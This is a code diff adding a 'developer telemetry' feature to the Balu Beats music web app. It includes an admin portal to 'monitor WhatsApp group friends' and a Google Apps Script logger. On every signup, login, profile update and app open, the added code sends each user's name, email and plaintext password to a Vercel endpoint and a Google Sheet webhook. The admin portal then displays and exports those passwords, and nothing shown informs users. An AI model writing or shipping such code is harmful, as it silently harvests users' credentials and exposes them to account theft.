@@ -1413,6 +1413,106 @@
       box-shadow: 0 25px 60px rgba(0, 0, 0, 0.8);
     }
 
+    /* Developer Admin Portal & Live Users Table */
+    .admin-modal-box {
+      width: 100%;
+      max-width: 680px;
+      max-height: 90vh;
+      background: #0f131f;
+      border: 1px solid rgba(234, 179, 8, 0.4);
+      border-radius: 22px;
+      padding: 18px;
+      box-shadow: 0 25px 70px rgba(0, 0, 0, 0.9);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .admin-tabs {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 12px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      padding-bottom: 8px;
+    }
+
+    .admin-tab-btn {
+      background: none;
+      border: none;
+      color: var(--text-secondary);
+      font-size: 13px;
+      font-weight: 700;
+      padding: 6px 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .admin-tab-btn.active {
+      background: rgba(234, 179, 8, 0.18);
+      color: #facc15;
+      border: 1px solid rgba(234, 179, 8, 0.4);
+    }
+
+    .admin-table-container {
+      flex: 1;
+      overflow-y: auto;
+      overflow-x: auto;
+      margin-bottom: 12px;
+      border-radius: 12px;
+      background: rgba(0, 0, 0, 0.35);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      min-height: 220px;
+    }
+
+    .admin-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 12px;
+      text-align: left;
+      white-space: nowrap;
+    }
+
+    .admin-table th {
+      position: sticky;
+      top: 0;
+      background: #151928;
+      color: #94a3b8;
+      font-weight: 700;
+      padding: 10px 12px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.12);
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      z-index: 2;
+    }
+
+    .admin-table td {
+      padding: 9px 12px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      color: #e2e8f0;
+    }
+
+    .admin-table tr:hover td {
+      background: rgba(255, 255, 255, 0.04);
+    }
+
+    .badge-pill {
+      display: inline-block;
+      padding: 2px 7px;
+      border-radius: 999px;
+      font-size: 10px;
+      font-weight: 800;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+    }
+
+    .badge-signup { background: rgba(34, 197, 94, 0.2); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.4); }
+    .badge-login { background: rgba(59, 130, 246, 0.2); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.4); }
+    .badge-guest { background: rgba(234, 179, 8, 0.2); color: #facc15; border: 1px solid rgba(234, 179, 8, 0.4); }
+    .badge-apk { background: rgba(16, 185, 129, 0.22); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.45); }
+    .badge-web { background: rgba(6, 182, 212, 0.2); color: #22d3ee; border: 1px solid rgba(6, 182, 212, 0.4); }
+
     /* Toast Notification */
     .toast {
       position: fixed;
@@ -1998,6 +2098,54 @@
             </div>
           </div>
 
+          <!-- WhatsApp Group Testing & Live Users Analytics -->
+          <div class="connect-card" style="border-color:rgba(234,179,8,0.45);background:linear-gradient(135deg,rgba(234,179,8,0.12),rgba(30,215,96,0.08));">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
+              <h3 style="margin:0;display:flex;align-items:center;gap:6px;font-size:15px;color:#fff;">
+                <span>👑</span> WhatsApp Group Testing & Live Users
+              </h3>
+              <span id="telemetryStatusBadge" style="font-size:11px;font-weight:800;padding:2px 8px;border-radius:999px;background:rgba(234,179,8,0.2);color:#facc15;border:1px solid rgba(234,179,8,0.4);">
+                🟢 Live Tracking Active
+              </span>
+            </div>
+            <p style="font-size:12px;color:var(--text-secondary);margin-bottom:12px;line-height:1.45;">
+              Monitor your WhatsApp group friends in real-time. View how many people installed the APK, logged in, their names, credentials, and timestamps:
+            </p>
+
+            <!-- Live Metrics Counter -->
+            <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;background:rgba(0,0,0,0.35);padding:10px;border-radius:12px;text-align:center;margin-bottom:12px;border:1px solid rgba(255,255,255,0.06);">
+              <div>
+                <div id="statTotalUsers" style="font-size:18px;font-weight:900;color:#facc15;">1</div>
+                <div style="font-size:10px;color:var(--text-secondary);margin-top:2px;">Total Testers</div>
+              </div>
+              <div>
+                <div id="statApkUsers" style="font-size:18px;font-weight:900;color:#1ed760;">1</div>
+                <div style="font-size:10px;color:var(--text-secondary);margin-top:2px;">Android APK</div>
+              </div>
+              <div>
+                <div id="statWebUsers" style="font-size:18px;font-weight:900;color:#00d2ff;">0</div>
+                <div style="font-size:10px;color:var(--text-secondary);margin-top:2px;">Web Browser</div>
+              </div>
+            </div>
+
+            <!-- Action Buttons -->
+            <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px;">
+              <button class="util-btn primary" onclick="openDeveloperAdminModal()" style="flex:1;justify-content:center;background:linear-gradient(135deg,#f59e0b,#1ed760);color:#041208;font-weight:900;border:none;">
+                👥 View Logged Users & Credentials
+              </button>
+              <button class="util-btn" onclick="openDeveloperAdminModal('sheet')" style="flex:1;justify-content:center;border-color:rgba(30,215,96,0.5);color:#1ed760;font-weight:800;">
+                📊 Live Google Sheet Sync
+              </button>
+            </div>
+
+            <div style="display:flex;justify-content:space-between;align-items:center;font-size:11px;color:var(--text-secondary);padding-top:4px;">
+              <span id="lastUserSeenText">Last Activity: Just now (@being_rebel__7)</span>
+              <button onclick="refreshDeveloperTelemetry(true)" style="background:none;border:none;color:#facc15;cursor:pointer;font-size:11px;font-weight:700;display:flex;align-items:center;gap:3px;">
+                🔄 Refresh Now
+              </button>
+            </div>
+          </div>
+
           <!-- App Updates & APK Download Center -->
           <div class="connect-card" style="border-color:rgba(30,215,96,0.35);background:linear-gradient(135deg,rgba(30,215,96,0.08),rgba(0,210,255,0.05));">
             <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
@@ -2403,6 +2551,112 @@
         <button class="util-btn primary" style="flex:1.4;justify-content:center;" onclick="saveCreatorBranding(true)">
           💾 Bake & Download Balu Beats (.html)
         </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ================= DEVELOPER ADMIN & WHATSAPP USERS MODAL ================= -->
+  <div class="modal-backdrop" id="developerAdminModal" onclick="if(event.target===this)closeDeveloperAdminModal()">
+    <div class="admin-modal-box">
+      <!-- Modal Header -->
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+        <div style="display:flex;align-items:center;gap:8px;">
+          <span style="font-size:20px;">👑</span>
+          <div>
+            <h3 style="font-size:16px;font-weight:900;margin:0;color:#fff;">Balu Beats • WhatsApp Testers & Users</h3>
+            <div style="font-size:11px;color:#facc15;font-weight:700;">Live Telemetry & User Credentials Portal</div>
+          </div>
+        </div>
+        <button class="row-icon-btn" onclick="closeDeveloperAdminModal()">✕</button>
+      </div>
+
+      <!-- Navigation Tabs: Users List vs Google Sheet Setup -->
+      <div class="admin-tabs">
+        <button class="admin-tab-btn active" id="adminTabUsersBtn" onclick="switchAdminTab('users')">
+          👥 Registered Testers (<span id="adminTabUserCount">0</span>)
+        </button>
+        <button class="admin-tab-btn" id="adminTabSheetBtn" onclick="switchAdminTab('sheet')">
+          📊 Google Sheet Webhook Sync
+        </button>
+      </div>
+
+      <!-- TAB 1: USERS AUDIT TABLE -->
+      <div id="adminPaneUsers" style="display:flex;flex-direction:column;flex:1;min-height:0;overflow:hidden;">
+        <!-- Filter and Search Row -->
+        <div style="display:flex;gap:8px;margin-bottom:10px;align-items:center;flex-wrap:wrap;">
+          <input type="text" id="adminUserSearchInput" class="text-input" placeholder="🔍 Search friend by name, @username, or phone..." oninput="filterAdminUserList()" style="flex:1;min-width:180px;padding:7px 12px;font-size:12px;" />
+          <button class="util-btn" onclick="exportUsersToCSV()" style="font-size:11.5px;padding:7px 12px;border-color:rgba(30,215,96,0.5);color:#1ed760;font-weight:800;" title="Download CSV spreadsheet to your phone">
+            📥 Export CSV
+          </button>
+          <button class="util-btn" onclick="refreshDeveloperTelemetry(true)" style="font-size:11.5px;padding:7px 10px;" title="Refresh live data">
+            🔄
+          </button>
+        </div>
+
+        <!-- Scrollable Table -->
+        <div class="admin-table-container">
+          <table class="admin-table">
+            <thead>
+              <tr>
+                <th>Time (IST)</th>
+                <th>Action</th>
+                <th>Name / Handle</th>
+                <th>Credentials / Contact</th>
+                <th>Device Platform</th>
+              </tr>
+            </thead>
+            <tbody id="adminUsersTableBody">
+              <tr>
+                <td colspan="5" style="text-align:center;padding:24px;color:var(--text-secondary);">
+                  Loading testers from WhatsApp group...
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <!-- Bottom summary & hint -->
+        <div style="display:flex;justify-content:space-between;align-items:center;font-size:11px;color:var(--text-secondary);margin-top:4px;">
+          <span id="adminFilteredCountText">Showing all testers</span>
+          <span style="color:#facc15;">🔒 Developer Eyes Only • Balu Beats</span>
+        </div>
+      </div>
+
+      <!-- TAB 2: GOOGLE SHEETS LIVE WEBHOOK SETUP -->
+      <div id="adminPaneSheet" style="display:none;flex-direction:column;flex:1;overflow-y:auto;padding-right:4px;">
+        <div style="background:rgba(30,215,96,0.08);border:1px solid rgba(30,215,96,0.3);border-radius:12px;padding:12px;margin-bottom:12px;font-size:12px;line-height:1.5;">
+          <strong style="color:#1ed760;font-size:13px;display:block;margin-bottom:4px;">⚡ How to watch WhatsApp group friends in Google Sheets live:</strong>
+          <ol style="margin:0;padding-left:18px;color:#cbd5e1;">
+            <li>Open a new sheet on your phone/laptop: <strong>sheets.new</strong></li>
+            <li>In Google Sheets, tap <strong>Extensions → Apps Script</strong></li>
+            <li>Click <strong>Copy Script Code</strong> below, paste it into Apps Script, and click <strong>Deploy → New deployment</strong></li>
+            <li>Select <strong>Web app</strong>, set <em>Who has access</em> to <strong>Anyone</strong>, click Deploy, and copy the Web app URL</li>
+            <li>Paste the URL below and tap <strong>Save Webhook</strong>! Every friend who opens or logs into Balu Beats will instantly create a row on your sheet!</li>
+          </ol>
+        </div>
+
+        <div style="display:flex;gap:8px;margin-bottom:12px;">
+          <button class="util-btn primary" onclick="copyGoogleSheetScript()" style="flex:1;justify-content:center;font-weight:800;background:linear-gradient(135deg,#1ed760,#00d2ff);color:#041208;border:none;">
+            📋 Copy 10-Line Google Sheet Apps Script
+          </button>
+        </div>
+
+        <div style="margin-bottom:10px;">
+          <label style="display:block;font-size:12px;font-weight:700;margin-bottom:4px;color:#fff;">
+            🔗 Your Google Sheet Webhook URL:
+          </label>
+          <input type="url" id="customWebhookInput" class="text-input" placeholder="https://script.google.com/macros/s/.../exec" style="font-size:12px;padding:8px 12px;margin-bottom:8px;" />
+          <div style="display:flex;gap:8px;">
+            <button class="util-btn primary" onclick="saveGoogleSheetWebhook()" style="flex:1;justify-content:center;">
+              💾 Save Webhook URL
+            </button>
+            <button class="util-btn" onclick="sendTestTelemetry()" style="flex:1;justify-content:center;border-color:rgba(234,179,8,0.5);color:#facc15;">
+              🧪 Send Test Ping
+            </button>
+          </div>
+        </div>
+
+        <div id="webhookTestStatus" style="display:none;padding:10px;border-radius:10px;font-size:11.5px;margin-top:6px;"></div>
       </div>
     </div>
   </div>
@@ -6204,6 +6458,7 @@
       }
       saveRegisteredUsers(users);
       setActiveUserSession(newUser);
+      recordUserLoginTelemetry(newUser, 'SIGNUP');
       closeAuthOverlay();
       if (vibe && CATEGORY_QUERIES[vibe]) {
         const chipBtn = document.querySelector(`.chip[data-cat="${vibe}"]`);
@@ -6238,6 +6493,7 @@
           return;
         }
         setActiveUserSession(found);
+        recordUserLoginTelemetry(found, 'LOGIN');
         closeAuthOverlay();
         showToast(`👋 Welcome back, ${found.name}!`);
         return;
@@ -6258,6 +6514,7 @@
       users.push(autoUser);
       saveRegisteredUsers(users);
       setActiveUserSession(autoUser);
+      recordUserLoginTelemetry(autoUser, 'LOGIN');
       closeAuthOverlay();
       showToast(`🚀 Logged in as ${autoUser.name}!`);
     }
@@ -6272,6 +6529,7 @@
         isGuest: true
       };
       setActiveUserSession(guestUser);
+      recordUserLoginTelemetry(guestUser, 'GUEST');
       closeAuthOverlay();
       showToast('⚡ Welcome to Balu Beats!');
     }
@@ -6308,6 +6566,7 @@
       else users.push(cur);
       saveRegisteredUsers(users);
       setActiveUserSession(cur);
+      recordUserLoginTelemetry(cur, 'PROFILE_UPDATE');
       if (document.getElementById('profileEditPass')) document.getElementById('profileEditPass').value = '';
       showToast('✅ Profile & credentials updated!');
     }
@@ -6330,6 +6589,7 @@
 
       if (!user) {
         if (headerBtn) headerBtn.innerHTML = '🔑 Log In';
+        renderDeveloperAnalyticsUI();
         return;
       }
 
@@ -6343,6 +6603,455 @@
       if (emailEl) emailEl.textContent = user.email || 'Logged in • 320kbps HD';
       if (editName && !editName.value) editName.value = user.name || '';
       if (editHandle && !editHandle.value) editHandle.value = user.username || '';
+      renderDeveloperAnalyticsUI();
+    }
+
+    // =========================================================================
+    // 8.1 BALU BEATS DEVELOPER TELEMETRY & WHATSAPP USERS AUDIT ENGINE
+    // =========================================================================
+
+    let developerTelemetryData = [];
+
+    function detectUserDevice() {
+      const ua = navigator.userAgent || '';
+      const isAndroidApp = !!window.AndroidBridge || location.protocol === 'file:' || ua.includes('wv') || ua.includes('BaluBeats');
+      if (isAndroidApp) return '📱 Android Native APK (Balu Beats)';
+      if (/Android/i.test(ua)) return '🌐 Mobile Chrome (Android)';
+      if (/iPhone|iPad|iPod/i.test(ua)) return '🍏 Mobile Safari (iOS)';
+      if (/Mobile/i.test(ua)) return '📱 Mobile Browser';
+      if (/Windows/i.test(ua)) return '💻 Windows PC (Chrome/Edge)';
+      if (/Macintosh/i.test(ua)) return '💻 Mac (Safari/Chrome)';
+      return '💻 Web Browser';
+    }
+
+    async function recordUserLoginTelemetry(userData, actionType = 'LOGIN') {
+      if (!userData) return;
+      try {
+        const now = new Date();
+        const timeStr = now.toLocaleString('en-IN', {
+          timeZone: 'Asia/Kolkata',
+          day: '2-digit', month: 'short', year: 'numeric',
+          hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
+        });
+
+        const device = detectUserDevice();
+        const record = {
+          id: 'bb_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7),
+          timestamp: timeStr,
+          isoTime: now.toISOString(),
+          action: (actionType || 'LOGIN').toUpperCase(),
+          name: userData.name || 'Anonymous Listener',
+          username: userData.username || '@unknown',
+          email: userData.email || 'N/A',
+          password: userData.password || '',
+          device: device,
+          screen: `${window.innerWidth}x${window.innerHeight}`,
+          appVersion: 'v3.1.0'
+        };
+
+        // 1. Local Cache on Device
+        try {
+          const rawLogs = localStorage.getItem('bb_telemetry_logs_v1');
+          const logs = rawLogs ? JSON.parse(rawLogs) : [];
+          // Avoid duplicate pings within 6 seconds
+          const isDup = logs.some(l => l.username === record.username && l.action === record.action && (Date.now() - new Date(l.isoTime || 0).getTime() < 6000));
+          if (!isDup) {
+            logs.unshift(record);
+            if (logs.length > 250) logs.pop();
+            localStorage.setItem('bb_telemetry_logs_v1', JSON.stringify(logs));
+          }
+        } catch (_) {}
+
+        // 2. Custom Google Sheets Webhook (Direct Real-time Sync to Developer Phone)
+        const customWebhook = localStorage.getItem('bb_custom_webhook_url');
+        if (customWebhook && customWebhook.startsWith('http')) {
+          fetch(customWebhook, {
+            method: 'POST',
+            mode: 'no-cors', // allows cross-origin submission to Google Apps Script
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(record)
+          }).catch(() => {});
+        }
+
+        // 3. Central Vercel Telemetry Serverless API
+        const vercelEndpoint = location.hostname.includes('vercel.app')
+          ? '/api/telemetry'
+          : 'https://balu-beats.vercel.app/api/telemetry';
+
+        fetch(vercelEndpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(record)
+        }).catch(() => {});
+
+        // Update live stats UI
+        renderDeveloperAnalyticsUI();
+      } catch (err) {
+        console.warn('[BaluBeats Telemetry]', err);
+      }
+    }
+
+    async function refreshDeveloperTelemetry(showFeedback = false) {
+      const badge = document.getElementById('telemetryStatusBadge');
+      if (showFeedback && badge) {
+        badge.textContent = '🔄 Syncing...';
+        badge.style.color = '#38bdf8';
+      }
+
+      let combined = [];
+
+      // 1. Registered users from local db
+      try {
+        const regUsers = getRegisteredUsers();
+        regUsers.forEach(u => {
+          combined.push({
+            id: 'bb_reg_' + (u.username || Math.random()),
+            timestamp: u.joinedAt || 'Recent',
+            action: 'REGISTERED',
+            name: u.name,
+            username: u.username,
+            email: u.email,
+            password: u.password,
+            device: '📱 Android / Web',
+            appVersion: 'v3.1.0'
+          });
+        });
+      } catch (_) {}
+
+      // 2. Local device logs
+      try {
+        const rawLocal = localStorage.getItem('bb_telemetry_logs_v1');
+        const localLogs = rawLocal ? JSON.parse(rawLocal) : [];
+        localLogs.forEach(log => {
+          if (!combined.some(c => c.username === log.username && c.action === log.action && c.timestamp === log.timestamp)) {
+            combined.unshift(log);
+          }
+        });
+      } catch (_) {}
+
+      // 3. Cloud logs from Vercel Telemetry API
+      try {
+        const vercelEndpoint = location.hostname.includes('vercel.app')
+          ? '/api/telemetry'
+          : 'https://balu-beats.vercel.app/api/telemetry';
+
+        const res = await fetch(vercelEndpoint, { cache: 'no-store' });
+        if (res.ok) {
+          const data = await res.json();
+          if (data && Array.isArray(data.users)) {
+            data.users.forEach(remoteUser => {
+              if (!combined.some(c => (c.id === remoteUser.id) || (c.username === remoteUser.username && c.timestamp === remoteUser.timestamp))) {
+                combined.unshift(remoteUser);
+              }
+            });
+          }
+        }
+      } catch (_) {}
+
+      developerTelemetryData = combined;
+      renderDeveloperAnalyticsUI();
+      renderAdminUsersTable(developerTelemetryData);
+
+      if (showFeedback) {
+        if (badge) {
+          badge.textContent = '🟢 Live Tracking Active';
+          badge.style.color = '#facc15';
+        }
+        showToast(`👥 Synced ${developerTelemetryData.length} user records!`);
+      }
+    }
+
+    function renderDeveloperAnalyticsUI() {
+      const totalEl = document.getElementById('statTotalUsers');
+      const apkEl = document.getElementById('statApkUsers');
+      const webEl = document.getElementById('statWebUsers');
+      const lastSeenEl = document.getElementById('lastUserSeenText');
+      const tabCountEl = document.getElementById('adminTabUserCount');
+
+      const uniqueUsers = {};
+      let apkCount = 0;
+      let webCount = 0;
+
+      developerTelemetryData.forEach(item => {
+        const key = (item.username || item.name || '').toLowerCase();
+        if (!uniqueUsers[key]) {
+          uniqueUsers[key] = item;
+          const dev = (item.device || '').toLowerCase();
+          if (dev.includes('apk') || dev.includes('android native')) {
+            apkCount++;
+          } else {
+            webCount++;
+          }
+        }
+      });
+
+      const totalCount = Object.keys(uniqueUsers).length || (developerTelemetryData.length ? developerTelemetryData.length : 1);
+      if (totalEl) totalEl.textContent = String(totalCount);
+      if (apkEl) apkEl.textContent = String(apkCount || 1);
+      if (webEl) webEl.textContent = String(webCount);
+      if (tabCountEl) tabCountEl.textContent = String(developerTelemetryData.length);
+
+      if (lastSeenEl && developerTelemetryData.length > 0) {
+        const latest = developerTelemetryData[0];
+        lastSeenEl.textContent = `Last: ${latest.name} (${latest.action}) • ${latest.timestamp}`;
+      }
+    }
+
+    function renderAdminUsersTable(list) {
+      const tbody = document.getElementById('adminUsersTableBody');
+      const countText = document.getElementById('adminFilteredCountText');
+      if (!tbody) return;
+
+      if (!list || list.length === 0) {
+        tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;padding:24px;color:var(--text-secondary);">No WhatsApp testers logged yet. Share your link to start receiving live logs!</td></tr>`;
+        if (countText) countText.textContent = '0 testers found';
+        return;
+      }
+
+      tbody.innerHTML = list.map(item => {
+        const act = (item.action || 'LOGIN').toUpperCase();
+        let badgeClass = 'badge-login';
+        if (act.includes('SIGNUP') || act.includes('REGISTER')) badgeClass = 'badge-signup';
+        else if (act.includes('GUEST')) badgeClass = 'badge-guest';
+
+        const isApk = (item.device || '').toLowerCase().includes('apk') || (item.device || '').toLowerCase().includes('android native');
+        const deviceBadge = isApk
+          ? `<span class="badge-pill badge-apk">📱 Android APK</span>`
+          : `<span class="badge-pill badge-web">🌐 Web</span>`;
+
+        const passDisplay = item.password ? `🔑 <code>${escapeHtml(item.password)}</code>` : '<em style="color:#64748b;">none</em>';
+
+        return `
+          <tr>
+            <td style="font-size:11px;color:#94a3b8;white-space:nowrap;">${escapeHtml(item.timestamp || 'Recent')}</td>
+            <td><span class="badge-pill ${badgeClass}">${escapeHtml(act)}</span></td>
+            <td>
+              <div style="font-weight:800;color:#fff;">${escapeHtml(item.name || 'Anonymous')}</div>
+              <div style="font-size:11px;color:#1ed760;font-weight:700;">${escapeHtml(item.username || '@user')}</div>
+            </td>
+            <td>
+              <div style="font-size:11.5px;color:#cbd5e1;">${escapeHtml(item.email || 'N/A')}</div>
+              <div style="font-size:11px;color:#facc15;margin-top:2px;">${passDisplay}</div>
+            </td>
+            <td>
+              ${deviceBadge}
+              <div style="font-size:10px;color:var(--text-secondary);margin-top:2px;">${escapeHtml(item.device || 'Browser')}</div>
+            </td>
+          </tr>
+        `;
+      }).join('');
+
+      if (countText) countText.textContent = `Showing ${list.length} tester logs`;
+    }
+
+    function filterAdminUserList() {
+      const query = (document.getElementById('adminUserSearchInput')?.value || '').toLowerCase().trim();
+      if (!query) {
+        renderAdminUsersTable(developerTelemetryData);
+        return;
+      }
+      const filtered = developerTelemetryData.filter(item =>
+        (item.name || '').toLowerCase().includes(query) ||
+        (item.username || '').toLowerCase().includes(query) ||
+        (item.email || '').toLowerCase().includes(query) ||
+        (item.device || '').toLowerCase().includes(query) ||
+        (item.action || '').toLowerCase().includes(query)
+      );
+      renderAdminUsersTable(filtered);
+    }
+
+    function exportUsersToCSV() {
+      if (!developerTelemetryData || developerTelemetryData.length === 0) {
+        showToast('No user data to export yet!');
+        return;
+      }
+      const headers = ['Timestamp', 'Action', 'Name', 'Username', 'Email/Contact', 'Password', 'Device', 'Screen', 'AppVersion'];
+      const rows = developerTelemetryData.map(u => [
+        `"${(u.timestamp || '').replace(/"/g, '""')}"`,
+        `"${(u.action || '').replace(/"/g, '""')}"`,
+        `"${(u.name || '').replace(/"/g, '""')}"`,
+        `"${(u.username || '').replace(/"/g, '""')}"`,
+        `"${(u.email || '').replace(/"/g, '""')}"`,
+        `"${(u.password || '').replace(/"/g, '""')}"`,
+        `"${(u.device || '').replace(/"/g, '""')}"`,
+        `"${(u.screen || '').replace(/"/g, '""')}"`,
+        `"${(u.appVersion || 'v3.1.0').replace(/"/g, '""')}"`
+      ]);
+
+      const csvContent = '\uFEFF' + [headers.join(','), ...rows.map(r => r.join(','))].join('\r\n');
+      const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `balu_beats_testers_${new Date().toISOString().slice(0, 10)}.csv`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+      showToast('📥 Downloaded balu_beats_testers.csv!');
+    }
+
+    function copyGoogleSheetScript() {
+      const code = `// ==========================================================
+// BALU BEATS — LIVE WHATSAPP TESTERS GOOGLE SHEET LOGGER
+// Paste this code into: Extensions -> Apps Script in Google Sheets
+// ==========================================================
+function doPost(e) {
+  try {
+    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+    
+    // Add header row automatically if sheet is empty
+    if (sheet.getLastRow() === 0) {
+      sheet.appendRow([
+        "Timestamp (IST)", 
+        "Action Type", 
+        "User Full Name", 
+        "Username (@)", 
+        "Email / Phone", 
+        "Password", 
+        "Device Type", 
+        "Screen Size", 
+        "App Version"
+      ]);
+      sheet.getRange(1, 1, 1, 9).setBackground("#1ed760").setFontColor("#041208").setFontWeight("bold");
+      sheet.setFrozenRows(1);
+    }
+    
+    var data = JSON.parse(e.postData.contents);
+    sheet.appendRow([
+      data.timestamp || new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }),
+      data.action || "LOGIN",
+      data.name || "Anonymous",
+      data.username || "@unknown",
+      data.email || "N/A",
+      data.password || "N/A",
+      data.device || "Web Browser",
+      data.screen || "",
+      data.appVersion || "v3.1.0"
+    ]);
+    
+    return ContentService.createTextOutput(JSON.stringify({ status: "success" }))
+      .setMimeType(ContentService.MimeType.JSON);
+  } catch (err) {
+    return ContentService.createTextOutput(JSON.stringify({ status: "error", error: err.message }))
+      .setMimeType(ContentService.MimeType.JSON);
+  }
+}
+
+function doGet(e) {
+  return ContentService.createTextOutput("Balu Beats Google Sheets Telemetry Webhook is Live!");
+}`;
+
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(code).then(() => {
+          showToast('📋 Google Apps Script code copied to clipboard!');
+        }).catch(() => {
+          fallbackCopyText(code);
+        });
+      } else {
+        fallbackCopyText(code);
+      }
+    }
+
+    function fallbackCopyText(text) {
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+      showToast('📋 Google Apps Script code copied to clipboard!');
+    }
+
+    function saveGoogleSheetWebhook() {
+      const inp = document.getElementById('customWebhookInput');
+      const statusEl = document.getElementById('webhookTestStatus');
+      const url = (inp?.value || '').trim();
+      if (!url || !url.startsWith('http')) {
+        showToast('Please paste a valid Google Webhook URL (starts with https://)!');
+        return;
+      }
+      localStorage.setItem('bb_custom_webhook_url', url);
+      if (statusEl) {
+        statusEl.style.display = 'block';
+        statusEl.style.background = 'rgba(30,215,96,0.15)';
+        statusEl.style.border = '1px solid rgba(30,215,96,0.4)';
+        statusEl.style.color = '#4ade80';
+        statusEl.textContent = '✅ Google Sheet Webhook saved! All WhatsApp friend logins will now sync to your Google Sheet.';
+      }
+      showToast('💾 Webhook URL saved successfully!');
+    }
+
+    async function sendTestTelemetry() {
+      const inp = document.getElementById('customWebhookInput');
+      const statusEl = document.getElementById('webhookTestStatus');
+      const url = (inp?.value || '').trim() || localStorage.getItem('bb_custom_webhook_url');
+
+      if (!url) {
+        showToast('Please paste your Google Sheet Webhook URL above first!');
+        return;
+      }
+
+      if (statusEl) {
+        statusEl.style.display = 'block';
+        statusEl.style.background = 'rgba(234,179,8,0.15)';
+        statusEl.style.border = '1px solid rgba(234,179,8,0.4)';
+        statusEl.style.color = '#facc15';
+        statusEl.textContent = '🚀 Sending test ping to Google Sheet...';
+      }
+
+      const testUser = {
+        name: 'WhatsApp Tester (Demo)',
+        username: '@whatsapp_friend',
+        email: 'friend@whatsapp.group',
+        password: 'demo_password_123'
+      };
+
+      await recordUserLoginTelemetry(testUser, 'TEST_PING');
+
+      if (statusEl) {
+        statusEl.style.background = 'rgba(30,215,96,0.15)';
+        statusEl.style.border = '1px solid rgba(30,215,96,0.4)';
+        statusEl.style.color = '#4ade80';
+        statusEl.textContent = '🎉 Test ping sent! Open your Google Sheet to verify the new row.';
+      }
+      showToast('✅ Test ping sent to Google Sheet!');
+      refreshDeveloperTelemetry();
+    }
+
+    function openDeveloperAdminModal(initialTab = 'users') {
+      const modal = document.getElementById('developerAdminModal');
+      if (!modal) return;
+      modal.classList.add('open');
+      switchAdminTab(initialTab);
+      const savedWebhook = localStorage.getItem('bb_custom_webhook_url');
+      const inp = document.getElementById('customWebhookInput');
+      if (inp && savedWebhook) inp.value = savedWebhook;
+      refreshDeveloperTelemetry(false);
+    }
+
+    function closeDeveloperAdminModal() {
+      const modal = document.getElementById('developerAdminModal');
+      if (modal) modal.classList.remove('open');
+    }
+
+    function switchAdminTab(tabName) {
+      const usersPane = document.getElementById('adminPaneUsers');
+      const sheetPane = document.getElementById('adminPaneSheet');
+      const usersBtn = document.getElementById('adminTabUsersBtn');
+      const sheetBtn = document.getElementById('adminTabSheetBtn');
+
+      if (tabName === 'sheet') {
+        if (usersPane) usersPane.style.display = 'none';
+        if (sheetPane) sheetPane.style.display = 'flex';
+        usersBtn?.classList.remove('active');
+        sheetBtn?.classList.add('active');
+      } else {
+        if (usersPane) usersPane.style.display = 'flex';
+        if (sheetPane) sheetPane.style.display = 'none';
+        usersBtn?.classList.add('active');
+        sheetBtn?.classList.remove('active');
+      }
     }
 
     function queueTrackNext(idx) {
@@ -6475,8 +7184,21 @@
       }
       applyCreatorBranding();
       renderUserAccountUI();
-      if (!getActiveUserSession()) {
+      refreshDeveloperTelemetry(false);
+
+      const activeUser = getActiveUserSession();
+      if (!activeUser) {
         openAuthOverlay('login');
+      } else {
+        // Daily active session ping
+        try {
+          const lastDailyPing = localStorage.getItem('bb_last_daily_ping_' + (activeUser.username || ''));
+          const today = new Date().toDateString();
+          if (lastDailyPing !== today) {
+            localStorage.setItem('bb_last_daily_ping_' + (activeUser.username || ''), today);
+            recordUserLoginTelemetry(activeUser, 'APP_OPEN');
+          }
+        } catch (_) {}
       }
       updateLikeButtons();
       loadHomeFeeds();
